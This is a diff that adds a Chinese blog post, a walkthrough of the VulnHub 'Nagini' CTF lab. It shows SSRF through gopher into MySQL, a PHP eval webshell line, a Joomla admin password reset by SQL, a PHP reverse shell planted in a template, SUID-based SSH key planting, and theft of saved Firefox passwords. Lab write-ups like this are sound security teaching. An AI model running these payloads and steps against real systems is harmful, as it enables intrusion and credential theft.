@@ -1,0 +1,320 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x14-VulnHub靶机-Nagini  | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x14-VulnHub靶机-Nagini  | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+靶机地址: https://download.vulnhub.com/harrypotter/Nagini.ova
+难度:有点难
+内容
+
+SSRF (Gopher协议 + Mysql）
+http3 (但我懒得搞)
+已知cms后台搜索法..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x14-VulnHub靶机-Nagini 
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-19
+              </span>
+              <span>
+                6 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>靶机地址: https://download.vulnhub.com/harrypotter/Nagini.ova</p>
+<p>难度:有点难</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>SSRF (Gopher协议 + Mysql）</li>
+<li>http3 (但我懒得搞)</li>
+<li>已知cms后台搜索法</li>
+<li>SSH公钥登录 (传公钥到靶机上</li>
+<li>破解浏览器文件.mozilla  得到遗留密码</li>
+</ul>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规主机发现 端口扫描</p>
+<p>然后80端口就是一张图片  没啥可以利用得</p>
+<p>第一次目录扫描扫出        Joomla CMS  版本是最新的            常规方法试了没啥结果</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182030352.png" alt="image-20240318203027309" loading="lazy"></figure>
+<p>再扫joomla 还是发现很多东西的		但是没什么可以利用的</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182034539.png" alt="image-20240318203429466" loading="lazy"></figure>
+<p>用大字典继续扫</p>
+<p>dirsearch -u http://192.168.3.131/ -w /home/maomao/桌面/lujing.txt -f -e txt,bak,sql,zip</p>
+<p>bak 指的是备份文件</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182049410.png" alt="image-20240318204946381" loading="lazy"></figure>
+<p>发现个note.txt   给了两个提示</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182050179.png" alt="image-20240318205017153" loading="lazy"></figure>
+<p>修改hosts文件 然后用http3协议去访问   正常去访问看到的还是ip访问一样的内容</p>
+<pre><code>192.168.3.131   192.168.3.131   quic.nagini.hogwarts
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182058389.png" alt="image-20240318205845332" loading="lazy"></figure>
+<p>admin提示在本周之后就会去删除这个文件/internalResourceFeTcher.php，还有服务器上面有一些配置文件，这些配置文件是所有人都可以读取的  还提示有备份文件</p>
+<p>joomal的配置文件:configuration.php</p>
+<p>就去访问一下 提示给我们的路径</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182102466.png" alt="image-20240318210231428" loading="lazy"></figure>
+<h2 id="ssrf">SSRF</h2>
+<p>Welcome to Internal Network Resource Fetching Page    欢迎来到内网资源获取页面</p>
+<p>这意味着我们可以访问到内网的资源   我们现在在外网  这就是ssrf 服务器端请求伪造</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182131897.png" alt="image-20240318213120853" loading="lazy"></figure>
+<p>但是用file协议你要知道绝对路径才可以去读东西  当然可以去访问一下默认的配置文件有没有啥东西</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182139986.png" alt="image-20240318213908927" loading="lazy"></figure>
+<p>这里提示其实是要你正常去访问他的备份  你去访问/joomla/configuration.php其实存在但是你看到内容 这上面我们用他这个ssrf去访问的</p>
+<p>/joomla/configuration.php.bak就可以下载出来</p>
+<pre><code> public $dbtype = 'mysqli'; public $host = 'localhost'; public $user = 'goblin'; public $password = ''; public $db = 'joomla'; public $dbprefix = 'joomla_'; public $live_site = ''; public $secret = 'ILhwP6HTYKcN7qMh'; public 
+</code></pre>
+<p>这里发现了数据库的信息 而且没有密码  这里正愁不知道怎么突破外网了   这就送上来了</p>
+<p>SSRF突破边界的方法就是用gopher协议 通过mysql redis 等服务写🐎进去</p>
+<p>这里有数据库配置信息 我们用gopher协议判断是否开放了3306端口</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182157687.png" alt="image-20240318215722666" loading="lazy"></figure>
+<p>发现右上角一直跳动,那么后端是开放了3306端口的，只不过没有对外开放</p>
+<h2 id="利用gopher协议突破边界">利用gopher协议突破边界</h2>
+<p>利用gopher对mysql服务发送一些指令，读取数据库的信息，使用到一款工具Gopherus-master来进行生成向后端mysql发送指令的payload</p>
+<h3 id="直接写">直接写🐎</h3>
+<p>试图直接写个🐎进去   但是写不进去</p>
+<p><code>select '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;' into outfile '/var/www/html/ssrf.php'；</code></p>
+<h3 id="读数据库的东西">读数据库的东西</h3>
+<p>goblin</p>
+<p>这里知道public $db = 'joomla'; 库名</p>
+<p>use joomla;show tables;   用工具生成出来的还要url编码一下 (后面的那部分)</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182225096.png" alt="image-20240318222502023" loading="lazy"></figure>
+<p>发现个joomla_users</p>
+<p><code>use joomla;select * from joomla_users ;</code></p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182237530.png" alt="image-20240318223727508" loading="lazy"></figure>
+<p>直接你发现了 账号密码 但是这个密码是加密的   可以选择去进行解密，但是既然可以操作数据库，那么直接将site_admin的密码更换成mao（md5加密）</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182256881.png" alt="image-20240318225604859" loading="lazy"></figure>
+<p><code>use joomla;update joomla_users set password=&quot;3fe8ebd7f5996651fa46c4aefe24b6af&quot; where  username=&quot;site_admin&quot;;</code></p>
+<p>更新完密码之后 去到那个登录界面 登入进后台</p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403182258799.png" alt="image-20240318225824712" loading="lazy"></figure>
+<h2 id="joomla后台">joomla后台</h2>
+<p>直接去网上搜  joomal后台getshell  https://blog.csdn.net/qq_42084004/article/details/118971341</p>
+<p>去kali找一个反弹shell的🐎    位置在：/usr/share/webshells/php/php-reverse-shell.php</p>
+<p>把🐎写到error.php  找到文件位置 然后去访问</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403190952548.png" alt="image-20240319095240483" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403190953513.png" alt="image-20240319095342466" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<h3 id="第一次">第一次</h3>
+<p>在snape用户下 发现第一个flag     TG92ZUBsaWxseQ==  base64解码是 Love@lilly   文件名 .creds.txt 信用   猜可能是密码</p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403190957845.png" alt="image-20240319095720814" loading="lazy"></figure>
+<p>用ssh去连接一下 root snape  hermoine  就snape 用户成功登录了</p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191002168.png" alt="image-20240319100220135" loading="lazy"></figure>
+<p>发现第一个flag</p>
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191005993.png" alt="" loading="lazy"></figure>
+<h3 id="第二次">第二次</h3>
+<p>上传工具上去扫 发现有个suid  这个应该类似cp  并且其他用户可以执行</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191013454.png" alt="image-20240319101352429" loading="lazy"></figure>
+<p>那么思路就是将自己kali的<strong>公钥传输到目标中</strong>，使用su_cp命令，将<strong>公钥复制到hermoine的.ssh</strong>文件夹下，这样子kali就可以凭借公钥直接登录hermoine账号</p>
+<p>生成kali的密钥对  <code>ssh-keygen</code></p>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191124500.png" alt="image-20240319112408470" loading="lazy"></figure>
+<p>使用scp将公钥传输到snape账号的主目录下</p>
+<p><code>scp id_rsa.pub snape@192.168.3.131:~/</code></p>
+<p>改名为authorized_keys</p>
+<p><code>mv id_rsa.pub authorized_keys</code></p>
+<p>使用su_cp将公钥拷贝到hermoine的.ssh目录下(**给公钥640权限 **      //这里正是因为su_cp有suid权限 如果没这权限 移动不了</p>
+<p>/home/hermoine/bin/su_cp authorized_keys  /home/hermoine/.ssh</p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191104172.png" alt="image-20240319110401146" loading="lazy"></figure>
+<p>然后kali连接  (密钥对连接   ) 指定文件 -i 去连接</p>
+<p>这里要注意 kali要用 root权限去连接</p>
+<figure data-type="image" tabindex="22"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191034907.png" alt="image-20240319103419864" loading="lazy"></figure>
+<p>注意 这里私钥的权限不要给大了  要给 600</p>
+<figure data-type="image" tabindex="23"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191130187.png" alt="image-20240319113043153" loading="lazy"></figure>
+<h3 id="第三次">第三次</h3>
+<p>这里用到了个没学过的方法 (破解浏览器的遗留密码 然后尝试登入root )</p>
+<p>在hermoine的主目录下有.mozilla的隐藏文件</p>
+<p><strong>.mozilla</strong>是linux使用firefox浏览器所生成的文件，里面有使用firefox浏览器下的拓展、安装等信息，还有记住的某些web系统的账号密码</p>
+<p>使用<strong>scp</strong>将.mozilla传输到kali，使用一款针对firefox浏览器账号密码还原的工具<strong>firefox_decrypt</strong></p>
+<p>工具地址：https://github.com/unode/firefox_decrypt</p>
+<p><code>scp -rp hermoine@192.168.3.131:~/.mozilla /tmp</code></p>
+<figure data-type="image" tabindex="24"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191114537.png" alt="image-20240319111419495" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191134781.png" alt="image-20240319113405737" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191136505.png" alt="image-20240319113634471" loading="lazy"></figure>
+<p><code>python3 firefox_decrypt.py /tmp/.mozilla/firefox</code></p>
+<p>发现个root密码</p>
+<figure data-type="image" tabindex="27"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191139812.png" alt="image-20240319113915776" loading="lazy"></figure>
+<p>尝试去ssh 连接root</p>
+<figure data-type="image" tabindex="28"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403191139490.png" alt="image-20240319113952455" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a>
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#ssrf">SSRF</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8gopher%E5%8D%8F%E8%AE%AE%E7%AA%81%E7%A0%B4%E8%BE%B9%E7%95%8C">利用gopher协议突破边界</a>
+<ul>
+<li><a href="#%E7%9B%B4%E6%8E%A5%E5%86%99">直接写🐎</a></li>
+<li><a href="#%E8%AF%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%9C%E8%A5%BF">读数据库的东西</a></li>
+</ul>
+</li>
+<li><a href="#joomla%E5%90%8E%E5%8F%B0">joomla后台</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
+<ul>
+<li><a href="#%E7%AC%AC%E4%B8%80%E6%AC%A1">第一次</a></li>
+<li><a href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1">第二次</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E6%AC%A1">第三次</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/0x13-vulnhub-ba-ji-doubletrouble/">
+              <h3 class="post-title">
+                0x13-VulnHub靶机-doubletrouble
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
